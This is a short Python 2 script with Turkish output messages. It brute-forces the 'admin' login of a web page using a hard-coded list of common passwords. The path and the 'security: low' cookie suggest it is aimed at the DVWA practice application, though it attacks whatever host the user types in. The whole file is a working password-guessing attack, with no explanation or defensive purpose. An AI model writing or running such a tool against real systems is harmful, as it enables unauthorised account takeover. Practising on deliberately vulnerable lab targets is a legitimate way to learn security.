
	import sys
	import requests

	passList = ['admin', 'pass', 'wqerty', '1234567', 'king', 'password', 'ali']
	username = 'admin'

	url = raw_input('Web sitesi adresini giriniz: ')

	cookies = {'security' : 'low'}

	for password in passList:
	   req = requests.get('http://' + url + '/vulnerabilities/brute/index.php?username=' + username + '&password=' + password + '&Login=Login', cookies=cookies)
	   print req.cookies
	   data = req.text
	   
	   if 'Welcome to the password protected area' in data:
	      print '[*] Parola denemesi basarili.  [' + password + ']'
	      sys.exit()
	   else:
	      print '[!] Parola denemesi basarisiz. [' + password + ']'
